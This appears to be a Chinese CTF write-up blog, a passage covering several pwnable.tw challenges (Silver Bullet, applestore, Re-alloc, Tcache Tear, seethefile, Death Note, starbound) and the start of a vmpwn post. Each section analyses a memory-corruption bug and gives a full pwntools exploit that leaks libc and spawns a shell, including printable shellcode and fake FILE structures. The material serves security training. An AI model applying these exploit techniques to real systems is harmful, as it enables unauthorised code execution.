Bullet\n\n很有意思的题目\n\n![image-20201215161015680](https://i.loli.net/2020/12/15/EyClmD9KjWbcprH.png)\n\n类似一个游戏，如果你的输入长度大于0x7fffffff，就可以杀死狼人\n\n关键函数在于power up中\n\n```c\nint __cdecl power_up(char *dest)\n{\n  char s; // [esp+0h] [ebp-34h]\n  size_t v3; // [esp+30h] [ebp-4h]\n\n  v3 = 0;\n  memset(&s, 0, 0x30u);\n  if ( !*dest )\n    return puts(\"You need create the bullet first !\");\n  if ( *((_DWORD *)dest + 12) > 0x2Fu )\n    return puts(\"You can't power up any more !\");\n  printf(\"Give me your another description of bullet :\");\n  read_input(&s, 0x30 - *((_DWORD *)dest + 12));      //限制输入长度\n  strncat(dest, &s, 0x30 - *((_DWORD *)dest + 12));   \n  v3 = strlen(&s) + *((_DWORD *)dest + 12);\n  printf(\"Your new power is : %u\\n\", v3);\n  *((_DWORD *)dest + 12) = v3;                         //漏洞点\n  return puts(\"Enjoy it !\");\n}\n```\n\n看样子程序会很严格的限制你的输入长度，不会让你的输入超出缓冲区，\n\n但是有个致命错误在于v3(存放字节长度的变量)也会随之更新，并且没有限制power up的使用次数\n\n所以比方说，我们先申请了40个字，然后power up了8个，那么现在的新长度就被更新到8\n\n根据上面的程序可知，我们又有了0x30 - 8的输入空间，就可以造成栈溢出了\n\n第一次溢出用ROP泄露libc\n\n第二次覆盖返回地址位system即可\n\n### exp\n\n```python\nfrom pwn import *\nelf = ELF('./silver_bullet')\n# libc = ELF('/lib/i386-linux-gnu/libc.so.6')\nlibc = ELF('libc_32.so.6')\n# p = elf.process()\np = remote('chall.pwnable.tw', 10103)\n# context.log_level = 'debug'\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\n\ndef add(con):\n    p.sendlineafter(\"Your choice :\",'1')\n    p.sendlineafter(\"Give me your description of bullet :\",str(con))\n\ndef edit(con):\n    p.sendlineafter(\"Your choice :\",'2')\n    p.sendlineafter(\"Give me your another description of bullet :\",str(con))\n\ndef beat():\n    p.sendlineafter(\"Your choice :\",'3')\n\ndef quit0():\n    p.sendlineafter(\"Your choice :\",'4')\n\nadd('a'*46)\nedit('b'*2)\nedit('\\xff'*7 + p32(puts_plt)+p32(0x8048954)+p32(puts_got))\n\nbeat()\np.recvuntil('You win !!\\n')\nlibc_base = u32(p.recv(4)) - libc.sym['puts']\ninfo(hex(libc_base))\nlibc.address = libc_base\n\nsystem = libc.sym['system']\nstr_sh = libc.search('/bin/sh').next()\ninfo(hex(system))\nadd('a'*46)\nedit('b'*2)\nedit('\\xff'*7 + p32(system)+p32(0x8048954)+p32(str_sh) )\nbeat()\np.interactive()\n```\n\n## 0x08 applestore\n\n一道题想了整整一天，只能说思路真的很新奇，利用方法很巧妙\n\n一个32位程序，买ipone然后加入购物车，还有计算账单和结账的功能\n\n但是在IDA中的程序很奇怪，不太好分析，经过一顿动调之后才发现，是一个双向链表结构管理的\n\n然后就开始一段漫长的改程序之旅，修改后的结构体如下：\n\n```c\n00000000 phone           struc ; (sizeof=0x10, mappedto_5)\n00000000 name            dd ?\n00000004 price           dd ?\n00000008 bk              dd ?\n0000000C fd              dd ?\n00000010 phone           ends\n```\n\n修改代码之后可读性好了很多\n\n插入函数：\n\n```c\nphone *__cdecl insert(phone *a1)\n{\n  phone *result; // eax\n  phone *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = (phone *)&myCart; i->bk; i = (phone *)i->bk )\n    ;\n  i->bk = (int)a1;\n  result = a1;\n  a1->fd = (int)i;\n  return result;\n}\n```\n\n很明显它会一直遍历，将新节点加入链表的末尾\n\n再看一下删除函数：\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  phone *v2; // [esp+14h] [ebp-34h]\n  int idx; // [esp+18h] [ebp-30h]\n  phone *BK; // [esp+1Ch] [ebp-2Ch]\n  phone *FD; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (phone *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  idx = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == idx )\n    {\n      BK = (phone *)v2->bk;\n      FD = (phone *)v2->fd;\n      if ( FD )\n        FD->bk = (int)BK;\n      if ( BK )\n        BK->fd = (int)FD;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, v2->name);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (phone *)v2->bk;\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n这里的逻辑就是常规的双向链表删除节点的操作，可以考虑进行类似unlink的利用\n\n再看一下cart函数\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int total_price; // [esp+1Ch] [ebp-2Ch]\n  phone *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  total_price = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (phone *)dword_804B070; i; i = (phone *)i->bk )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, i->name, i->price);\n      total_price += i->price;\n    }\n  }\n  return total_price;\n}\n```\n\n功能是将链表上的iphone名字和价格打印出来，并返回总价格\n\n关键点在于checkout的函数\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert((phone *)&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n有一个彩蛋，如果购买的iphone总价格是7174元，那么就会将iphone8加入到链表末尾(1块钱就能买到iphone8！)\n\n> 这里有个知识点是asprintf函数，这是一个增强版的sprintf函数，为了避免缓冲区溢出，它可以动态分配内存空间，相当于malloc()\n\n这里会将把v2添加到链表末尾，重点是v2还是一个栈地址，那么我们能够控制它吗？\n\n答案是可以的，我们可以看到cart函数的栈帧和checkout函数基本一样，cart函数的read()正好可以修改到这个位置，如果我们将v2改成某个函数的got表，那么通过cart函数就可以泄露出libc基址\n\n所以思路有了，下一步就是要做到正确触发彩蛋，很简单写个脚本爆破一下\n\n```python\nfor i in range(36):\n    for j in range(23):\n        for k in range(14):\n            for m in range(17):\n                for n in range(36):\n                    if(199*i+299*j+499*k+399*m+199*n == 7174):\n                        print \"1:\"+str(i)+\" \"+\"2:\"+str(j)+\" \"+\"3:\"+str(k)+\" \"+\"4:\"+str(m)+\" \"+\"5:\"+str(n)\n\n                        \n#1:6 2:20 3:0 4:0 5:0\n```\n\n所以只要买6个(1)和20个(2)就正好是7174元\n\n现在libc基址有了，就该考虑如何利用了\n\n**整道题的核心就是控制ebp**\n\n利用的就是delete函数\n\n![image-20201217154252205](https://i.loli.net/2020/12/17/HVaGcMygwkFnmTq.png)\n\n如果我们能将栈迁移到atoi的got表处，那么我们就可以对got表进行改写\n\n所以我们还需要想办法泄露栈的地址\n\n在libc中保存了一个函数叫_environ，存的是当前进程的环境变量\n\n通过\\_environ的地址得到\\_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量\n\n利用和之前相同的方法，把栈地址泄露出来 可得偏移为0x104\n\n然后构造payload可以修改最后一个节点的结构体\n\n`payload = '27' + p32(0) + p32(0)+p32(got_atoi + 0x22) + p32(stack - 0x8)`\n\n通过`FD->bk = (int)BK`就可以将ebp修改为got_atoi + 0x22，为什么要加0x22呢\n\n因为handle函数里read的buf地址为[ebp-0x22]，所以这样我们就可以修改atoi的got表了\n\n最后的最后，还要注意，在发生了read之后才会进入atoi，所以我们输入的system_addr的地址也会就进入到system函数中。不过有了hacknote的教训，我们知道，只需要加入一个`;`或者`||`就能够截断之前的字符串，于是我们可以发送: `p32(system_addr)+\";/bin/sh\"`\n\n综上，就可以完成这次攻击\n\n### exp\n\n```python\nfrom pwn import *\n# context(arch='i386', os='linux', log_level='debug')\nelf = ELF(\"./applestore\")\nlibc = ELF(\"libc_32.so.6\")\n# libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")\n# p = elf.process()\np = remote('chall.pwnable.tw', 10104)\n\ndef add(idx):\n\tp.sendlineafter(\"> \", str(2))\n\tp.sendlineafter(\"Device Number> \", str(idx))\n\ndef delete(idx):\n\tp.sendlineafter(\"> \", str(3))\n\tp.sendlineafter(\"Item Number> \", idx)\n\ndef cart(con):\n\tp.sendlineafter(\"> \", str(4))\n\tp.sendlineafter(\"Let me check your cart. ok? (y/n) > \", con)\n\ndef checkout(con):\n\tp.sendlineafter(\"> \", str(5))\n\tp.sendlineafter(\"Let me check your cart. ok? (y/n) > \", con)\n\natoi_got = elf.got['atoi']\ninfo(\"atoi_got:\" + hex(atoi_got))\n\nfor i in range(6):\n\tadd(1)\n\nfor i in range(20):\n\tadd(2)\ncheckout('y')\n\npayload = 'y\\x00' + p32(atoi_got) + p32(0) + p32(0)\ncart(payload)\n\np.recvuntil(\"27: \")\nlibc_base = u32(p.recv(4)) - libc.symbols['atoi']\nlibc.address = libc_base\nsystem = libc.symbols['system']\nenviron = libc.symbols['environ']\ninfo(\"environ:\" + hex(environ))\ninfo(\"libc_base:\" + hex(libc_base))\ninfo(\"system:\" + hex(system))\n\npayload = 'y\\x00' + p32(environ) + p32(0) + p32(0)\ncart(payload)\np.recvuntil(\"27: \")\nebp = u32(p.recv(4)) - 0x104\ninfo(\"ebp_addr:\" + hex(ebp))\n\npayload = '27' + p32(0) + p32(0) + p32(atoi_got + 0x22) + p32(ebp - 0x8)\n# gdb.attach(p)\ndelete(payload)\np.sendlineafter(\"> \", p32(system) + \";\\bin\\sh\")\n\np.interactive()\n```\n\n## 0x09 Re-alloc\n\n`I want to realloc my life :)`\n\n修改ELF文件头，改变动态加载器、libc以及符号表为libc2.29版本\n\n关于realloc函数，根据size的不同可以有多种功能\n\n1. `ptr == 0`: malloc(size)\n2. `ptr != 0 && size == 0`: free(ptr)\n3. `ptr != 0 && size == old_size`: edit(ptr)\n4. `ptr != 0 && size < old_size`: edit(ptr) and free(remainder)\n5. `ptr != 0 && size > old_size`: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr; \n\n所以利用思路是：\n\n- 利用uaf在tcache不同size的链表中放置一个`atoll_got`的chunk\n- 利用其中一个指向`atoll_got`的chunk更改`atoll_got`为`printf_plt`，这样在调用`atoll`时，就会调用`printf`从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak`__libc_start_main`。\n- 利用另一个指向`atoll_got`的chunk将`atoll_got`再改成`system`，注意因为此时`atoll`是`printf`，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。\n- 最后再输入`/bin/sh\\x00`调用`atoll`来执行`system(\"/bin/sh\");`getshell即可。\n\n### exp\n\n```python\nfrom pwn import *\n# p = remote(\"chall.pwnable.tw\", 10106)\nelf = ELF(\"./re-alloc\")\nlibc = ELF(\"./libc-2.29.so\")\np = elf.process()\n# context.log_level = \"debug\"\n\ndef add(idx,size,data):\n\tp.sendlineafter(\"Your choice: \",str(1))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Data:\")\n\tp.send(data)\n\ndef edit(idx,size,data):\n\tp.sendlineafter(\"Your choice: \",str(2))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tif size!=0:\n\t\tp.recvuntil(\"Data:\")\n\t\tp.send(data)\n\ndef delete(idx):\n\tp.sendlineafter(\"Your choice: \",str(3))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\nadd(0,0x18,'a'*8)\nedit(0,0,'') # free\nedit(0,0x18,p64(0x404048)) # chunk0 -> atoll_got()  tcache[0x20]\nadd(1,0x18,'a'*8)\n# clear heap[0],heap[1]\nedit(0,0x38,'a'*8) # chunk0 -> 0x38  tcache[0x40]\ndelete(0)\nedit(1,0x38,'b'*0x10) \ndelete(1)\n#again\nadd(0,0x48,'a'*0x8)\nedit(0,0,'')\nedit(0,0x48,p64(0x404048))# chunk0 -> atoll_got()  tcache[0x50]\nadd(1,0x48,'a'*0x8)\nedit(0,0x58,'a'*8)# chunk0 -> 0x38  tcache[0x60]\ndelete(0)\nedit(1,0x58,'b'*0x10)\ndelete(1)\n\nadd(0,0x48,p64(0x00401070))# plt_printf\np.sendlineafter(\"Your choice: \",str(1))\np.recvuntil(\"Index:\")\np.sendline('%paaa%pbbb%p')\n# p.recv()\np.recvuntil('bbb')\nlibc.address=int(p.recv(14),16)-0x12e009\ninfo(\"libc: \"+hex(libc.address))\n\np.sendlineafter(\"Your choice: \",str(1))\np.recvuntil(\":\")\np.sendline('a'+'\\x00')# idx = 1\np.recvuntil(\":\")\np.send('%15c')# size = 15\np.recvuntil(\"Data:\")\np.send(p64(libc.sym['system']))\np.sendlineafter(\"Your choice: \",str(3))\np.recvuntil(\"Index:\")\np.sendline(\"/bin/sh\\x00\")\np.interactive()\n```\n\n## 0x0A Tcache Tear\n\n查到该题目libc版本为2.27-3ubuntu1_amd64，该版本的tcache检查机制较少，可以利用double free进行地址任意写。\n\n```c\nif ( v4 <= 7 )\n{\n    free(ptr);\n    ++v4;\n}\n```\n\nfree后没有将指针清空，存在UAF漏洞，利用方法是在可写的bss段构造一个size大于tcache的fake chunk，然后free，使其进入unsorted bin，泄露出libc基址。进而再次利用任意地址写修改libc中可用的函数指针，最终getshell。\n\n这里需要注意的是，tcache使用 64 个单链表结构的 bins，每个 bins 最多存放 7 个 chunk，64位程序tcache最大为0x408，因此需要伪造大于0x408大小才能放入unsorted bin，并且伪堆块后面的数据也要满足基本的堆块格式，而且至少两块，因此free时，会对当前的堆块进行一系列检查\n\n```c\n// 在 _int_free 函数中\nif (nextchunk != av->top) {\n  /* get and clear inuse bit */\n  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n```\n\n可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。\n\n### exp\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\ncontext.terminal = [\"tmux\",\"splitw\",\"-h\"]\n# exe = context.binary = ELF('./test')\nelf=ELF('./tcacher')\nlibc = ELF('/root/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')\nexe = './tcacher' arg1 = ''; arg2 = '' \nhost = 'chall.pwnable.tw'\nport = 10207\nif args.I:\n    context.log_level='debug'\ndef local():\n    return process(argv = [exe,arg1,arg2])\ndef remote():\n    return connect(host, port)\nstart = remote if args.R else local\n\np   = lambda      : pause() \ns   = lambda x    : success(x)\nre  = lambda m    : io.recv(numb=m)\nru  = lambda x    : io.recvuntil(x)\nrl  = lambda      : io.recvline()\nsd  = lambda x    : io.send(x)\nsl  = lambda x    : io.sendline(x)\nia  = lambda      : io.interactive()\nsla = lambda a, b : io.sendlineafter(a, b)\nsa  = lambda a, b : io.sendafter(a, b)\nuu32 = lambda x   : u32(x.ljust(4,b'\\x00'))\nuu64 = lambda x   : u64(x.ljust(8,b'\\x00'))\n\n#==================================================\ndef add(size,data):\n    sla(\"Your choice :\" , '1')\n    sla(\"Size:\" , str(size))\n    sla(\"Data:\" , data)\ndef delete():\n    sla(\"Your choice :\" , '2')\ndef show():\n    sla(\"Your choice :\" , '3')\ndef exit():\n    sla(\"Your choice :\" , '4')\nname = 0x0000000000602060\n\nio = start()\nsla(\"Name:\" , p64(0) + p64(0x501))\nadd(0x50,'a'*24)\ndelete()\ndelete()\nadd(0x50,p64(name+0x500))\nadd(0x50,p64(name+0x500))\nadd(0x50,(p64(0)+p64(0x21)*2)*2)\n\nadd(0x60,'a')\ndelete()\ndelete()\nadd(0x60,p64(name+0x10))\n# add(0x60,'a')\nadd(0x60,\"ld1ng\")\nadd(0x60,\"ld1ng\")\n\ndelete()\nshow()\nru(p64(0x501))\nlibc_base = uu64(re(6))-96-0x10-libc.sym[\"__malloc_hook\"]\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\nog = [0x4f2c5,0x4f322,0x10a38c]\nrce = libc_base + og[1]\ninfo(\"libc_base: \" + hex(libc_base))\ninfo(\"free_hook: \" + hex(free_hook))\ninfo(\"rce: \" + hex(rce))\n\nadd(0x70,'a')\ndelete()\ndelete()\nadd(0x70,p64(free_hook))\nadd(0x70,\"ld1ng\")\nadd(0x70,p64(rce))\nadd(0x80,\"test\")\n# gdb.attach(io)\ndelete()\n\nio.interactive()\n```\n\n## 0x0B seethefile\n\nglibc2.23 ，题目实现了标准的open read write 的流程，但是通过限制文件名禁止读flag文件，漏洞点name和fp都是bss段数据，且相距很近，在退出时，输入name可以造成溢出覆盖到fp\n\n![image-20221124171057860](https://files.catbox.moe/n3dih2.png)\n\n![](https://files.catbox.moe/sy9dd5.png)\n\n建议学习[raycp大佬博客](https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis)，包括fread，fopen，fwrite，fclose的源码分析。\n\n这里的利用方法是伪造fake FILE，使得fclose时调用system。\n\nlibc的泄漏很简单，利用linux的proc伪文件系统读取`/proc/self/maps`即可获得libc基址，一次最多只能读取0x18f个字节，所以可以read两次，将其打印出来。\n\n一般我们读取的是/proc/[pid]/maps，可以获取任意进程的映射信息，这里我们使用self是为了获取当前进程的内存映射关系\n\n当读入一个文件后，_IO_list_all便指向当前fp，fclose之后，就指回sterr。\n\n![image-20221124172951035](https://files.catbox.moe/yxjzvh.png)\n\nfclose的核心部分由_IO_new_fclose完成，一共分为三个部分，代码如下：\n\n```c\nint _IO_new_fclose (_IO_FILE *fp)\n{\n  int status;\n\n  ... \n  \n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);//将fp从_IO_list_all链表中取下\n\n  ...\n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);  //关闭文件，并释放缓冲区。\n  ...\n  _IO_FINISH (fp);  //确认FILE结构体从链表中删除以及缓冲区被释放\n  ...\n  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)\n    {\n      fp->_IO_file_flags = 0;\n      free(fp);\n    }\n\n  return status;\n}\n```\n\n\\_IO_IS_FILEBUF为0x2000，\\_flags&0x2000为0就会直接调用\\_IO_FINSH(fp)，\\_IO_FINSH(fp)相当于调用fp->vtable->_finish(fp)\n\n将fp指向一块内存p，p偏移0的前4个字节设置为0xffffdfff，p偏移4的位置放上参数';/bin/sh'；p偏移sizeof(\\_IO_FILE)大小位置(vtable)覆盖为内存q，32位程序vtable偏移为0x98，q的2*4字节处(vtable->_finish)覆盖为system即可。\n\n### exp\n\n```python\n#==================================================\nio = start()\ndef openf(file):\n    sla(\":\",\"1\")\n    sla(\":\",file)\n\ndef readf():\n    sla(\":\",\"2\")\n\ndef writef():\n    sla(\":\",\"3\")\n\ndef closef():\n    sla(\":\",\"4\")\n\ndef quit(name):\n    sla(\":\",\"5\")\n    sla(\":\",name)\n\nopenf(\"/proc/self/maps\")\nreadf()\nwritef()\nreadf()\nwritef()\nru(b\"[heap]\\n\")\nlibc_base = int(re(8),16)+0x1000\ninfo(hex(libc_base))\nsystem = libc_base + libc.sym['system']\ninfo(hex(system))\n\nfakefile_addr = 0x0804B284\npayload = b\"a\"*0x20 + p32(fakefile_addr)\npayload += p32(0xffffdfff) + b\";/bin/sh\" #;$0\n# payload += b\"\\x00\"*0x88\npayload = payload.ljust(0x94+0x24,b\"\\x00\")\npayload += p32(fakefile_addr + 0x98)\npayload += p32(0)*2 + p32(system)\n\nquit(payload)\n\nia()\n```\n\n## 0x0C Death Note\n\n漏洞点在add时，利用了int类型的idx，所以可以修改到got表，利用add修改到puts的got，写入shellcode即可\n\n![image-20221126215338101](https://files.catbox.moe/omdov6.png)\n\n难点在于printable函数，限制了shellcode只能为可打印字符，所以int 0x80以及非可打印字符均不可使用。\n\n用到的方法是在shellcode的最后写入`'\\x6b\\x40'`，然后在shellcode中使用`sub byte ptr[eax + 43], dl`等，将`'\\x6b\\x40'`，修改为`\\xcd\\x80`，即int 0x80，eax = 0x0b则使用xor来实现\n\n### exp\n\n```python\nio = start()\ndef add(idx,name):\n    sla(\"choice :\",\"1\")\n    sla(\"Index :\",str(idx))\n    sla(\"Name :\",name)\n\ndef show(idx):\n    sla(\"choice :\",\"2\")\n    sla(\"Index :\",str(idx))\n\ndef delete(idx):\n    sla(\"choice :\",\"3\")\n    sla(\"Index :\",str(idx))\n# eax = 0xb ebx = /bin/sh ecx = 0 edx = 0 int 0x80 = /xcd/x80\nshellcode = '''\npush 0x68\npush 0x732f2f2f\npush 0x6e69622f\npush esp\npop ebx\n\npush edx\npop eax\npush 0x60\npop edx\nsub byte ptr[eax + 43], dl\nsub byte ptr[eax + 43], dl\nsub byte ptr[eax + 42], dl\npush 0x3e\npop edx\nsub byte ptr[eax + 42], dl\n\npush ecx\npop edx \npush edx\npop eax\nxor al, 0x60\nxor al, 0x6b\n    '''\nprint(asm(shellcode))\nshellcode = asm(shellcode) + b'\\x6b\\x40'\n# gdb.attach(io)\nadd(-16,shellcode)\n# delete(0)\nia()\n\n```\n\n![image-20221126220246095](https://files.catbox.moe/gqpdze.png)\n\n不太理解栈上`/bin/sh`字符串的截断问题，这里用的shellcraft.sh()中的/bin///sh\n\n## 0x0D starbound\n\n![image-20230301140357375](https://files.catbox.moe/u4xv4y.png)\n\n一个可以玩的游戏，代码量很大，漏洞在主函数输出选项时，调用函数指针，而索引v3是int型，造成越界访问。\n\n在设置中username可以自己设置，即可以修改bss段地址，计算偏移，可以得到位于-33的位置上。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  char nptr[256]; // [esp+10h] [ebp-104h] BYREF\n\n  init();\n  while ( 1 )\n  {\n    alarm(0x3Cu);\n    main_menu();\n    if ( !readn(nptr, 0x100u) )\n      break;\n    v3 = strtol(nptr, 0, 10);\n    if ( !v3 )\n      break;\n    ((void (*)(void))nop[v3])();// vlun\n  }\n  do_bye();\n  return 0;\n}\n```\n\n修改name为函数指针即可。\n\n### exp\n\n`0x0008048e48：add esp 0x1c `，要先调整栈帧，以能够执行到puts_plt，最后执行system(' -33;/bin/sh')，但是不理解为什么要在前面加个空格才能成功。\n\n```python\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain_addr = 0x0804A605\nsla('>','6')\nsla('>','2')\nsla(' name:',p32(0x0008048e48))\nsla('>',b'-33\\x00'+b'aaaa'+p32(puts_plt)+p32(main_addr)+p32(puts_got))\nlibc_base = l32() - 0x67d90\ninf(libc_base)\nogg = one_gadget(libc_base)\n# inf(ogg[0])\nsystem = libc_base + libc.sym['system']\nbinsh = next(libc.search(b'/bin/sh\\x00')) + libc_base\ninf(system)\ninf(binsh)\nsla('>','6')\nsla('>','2')\n# sla(' name:',p32(system))\n# sa('>',' -33;/bin/sh\\x00')\nsla(' name:',p32(ogg[1]))\ngdb.attach(io)\nsla('>','-33')\nia()\n```\n\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"Sep_Match 2020","url":"/2020/09/28/Sep_Match/","content":"\n# 0x00 前言\n\nCUMTCTF2020 出了一次题，第一次站在出题人角度看ctf比赛，\n\n收获颇多，体会到了出题人的辛苦，不过还好没出什么大问题\n\n# 0x01 gactf vmpwn\n\n第一次做vmpwn，模拟栈的程序，分析还挺麻烦，看了很久很久甚至不想写这篇博客...虚拟栈嘛肯定要用到逆向的知识\n\n总的思想malloc三块内存，分别存放寄存器、数据、指令\n\n源程序做了一点注释，没写完，好累，下面把所有指令整理成了指令集\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  unsigned __int8 *v3; // rax\n  _QWORD *v4; // rax\n  _QWORD *v5; // rax\n  _QWORD *v6; // rax\n  int v7; // ST0C_4\n  int v8; // ST0C_4\n  int v9; // ST0C_4\n  int v10; // ST0C_4\n  int v11; // ST0C_4\n  int v12; // ST0C_4\n  int v13; // ST0C_4\n  int v14; // ST0C_4\n  int v15; // ST0C_4\n  int v16; // ST0C_4\n  int v17; // ST0C_4\n  int v18; // ST0C_4\n  int v19; // ST0C_4\n  int v20; // ST0C_4\n  int v21; // ST0C_4\n  int v22; // ST0C_4\n  int v23; // ST0C_4\n  _QWORD *v24; // rax\n  __int64 result; // rax\n  signed int v26; // [rsp+Ch] [rbp-24h]\n  signed int v27; // [rsp+Ch] [rbp-24h]\n  signed int v28; // [rsp+Ch] [rbp-24h]\n  signed int v29; // [rsp+Ch] [rbp-24h]\n  signed int v30; // [rsp+Ch] [rbp-24h]\n  signed int v31; // [rsp+Ch] [rbp-24h]\n  signed int v32; // [rsp+Ch] [rbp-24h]\n  _QWORD *v33; // [rsp+10h] [rbp-20h]\n  char *v34; // [rsp+18h] [rbp-18h]\n  char *v35; // [rsp+20h] [rbp-10h]\n\n  sub_BA0();\n  v33 = calloc(0x30uLL, 1uLL);\n  v34 = (char *)calloc(0x1000uLL, 1uLL);        // .data\n  v35 = (char *)calloc(0x2000uLL, 1uLL);\n  v33[3] = v35 + 0x1E00;                        // rsp\n  v33[5] = &unk_203020;                         // op code\n  if ( !v34 || !v35 )\n    sub_AC0((__int64)\"out of memory\");\n  while ( 1 )\n  {\n    v3 = (unsigned __int8 *)v33[5];\n    v33[5] = v3 + 1;                            // pc\n    switch ( (unsigned int)off_1880 )\n    {\n      case 0x10u:\n        *v33 = v33[3];                          // mov rax,rsp\n        break;\n      case 0x11u:\n        *v33 = *(_QWORD *)v33[5];               // mov rax,i\n        v33[5] += 8LL;\n        break;\n      case 0x12u:\n        v33[1] = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        break;\n      case 0x13u:\n        v33[2] = *(_QWORD *)v33[5];\n        v33[5] += 8LL;\n        break;\n      case 0x20u:\n        v26 = *(_QWORD *)v33[5];\n        if ( v26 < 0 || v26 > 0xFFF )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *v33 = &v34[v26];                       // mov rax,&data[x]\n        v33[5] += 8LL;\n        break;\n      case 0x21u:\n        v27 = *(_QWORD *)v33[5];\n        if ( v27 < 0 || v27 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *v33 = *(_QWORD *)&v34[v27];            // mov rax,data[x]\n        v33[5] += 8LL;\n        break;\n      case 0x22u:\n        v28 = *(_QWORD *)v33[5];\n        if ( v28 < 0 || v28 > 0xFFF )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        v33[1] = *(_QWORD *)&v34[v28];\n        v33[5] += 8LL;\n        break;\n      case 0x23u:\n        v29 = *(_QWORD *)v33[5];\n        if ( v29 < 0 || v29 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        v33[2] = *(_QWORD *)&v34[v29];\n        v33[5] += 8LL;\n        break;\n      case 0x33u:\n        v30 = *(_QWORD *)v33[5];\n        if ( v30 < 0 || v30 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v30] = *v33;\n        v33[5] += 8LL;\n        break;\n      case 0x34u:\n        v31 = *(_QWORD *)v33[5];\n        if ( v31 < 0 || v31 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v31] = v33[1];\n        v33[5] += 8LL;\n        break;\n      case 0x35u:\n        v32 = *(_QWORD *)v33[5];\n        if ( v32 < 0 || v32 > 4095 )\n          sub_AC0((__int64)\"buffer overflow detected\");\n        *(_QWORD *)&v34[v32] = v33[2];\n        v33[5] += 8LL;\n        break;\n      case 0x44u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = *v33;               // push rax\n        break;\n      case 0x45u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = v33[1];\n        break;\n      case 0x46u:\n        if ( v33[3] - (_QWORD)v35 <= 8LL )\n          sub_AC0((__int64)\"stack underflow detected\");\n        v33[3] -= 8LL;\n        *(_QWORD *)v33[3] = v33[2];\n        break;\n      case 0x51u:\n        if ( v33[3] - (_QWORD)v35 > 0x1DFFLL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v4 = (_QWORD *)v33[3];\n        v33[3] = v4 + 1;\n        *v33 = *v4;\n        break;\n      case 0x52u:\n        if ( v33[3] - (_QWORD)v35 > 7679LL )\n          sub_AC0((__int64)\"stack overflow detected\");\n        v5 = 